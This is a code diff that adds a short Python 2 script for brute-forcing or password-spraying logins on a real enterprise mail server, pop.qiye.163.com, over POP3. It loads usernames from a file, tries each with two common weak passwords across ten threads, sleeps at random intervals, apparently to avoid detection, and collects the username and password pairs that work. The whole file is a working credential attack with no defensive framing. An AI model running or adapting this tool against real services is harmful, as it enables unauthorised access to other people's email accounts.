@@ -1,0 +1,60 @@
+import poplib
+from multiprocessing.dummy import Pool as ThreadPool
+import time
+import random
+
+success = []
+
+def bp163((user,passwd)):
+    user = user.strip()
+    passwd = passwd.strip()
+    
+    try:
+        print '.'
+        
+        sleeptime = random.randint(2, 5)
+        time.sleep(sleeptime)
+        
+        server = "pop.qiye.163.com"
+        pop = poplib.POP3(server,110,timeout=3)
+        pop.user(user)
+        auth = pop.pass_(passwd)        
+        
+            
+        if auth.split(' ')[0] == "+OK":
+            pop.quit()
+            success.append(user+'---'+passwd)
+            print  user+'---'+passwd+'\n'
+            
+        else:
+            pop.quit()
+        pop.quit()
+        
+           
+    except Exception,e:
+        pass
+
+# load users
+with open('users.txt') as f:
+ 
+    fu = [user for user in f]
+# load passwords
+fp = ['abc123','a12345']
+
+#generate pairs of user and password
+user_passwd = [(user,passwd) for user in fu for passwd in fp]
+
+
+pool = ThreadPool(10)
+pool.map(bp163, user_passwd)
+pool.close()
+pool.join()
+
+# print successful users and passwords
+for i in success:
+    print i
+
+  
+        
+        
+        
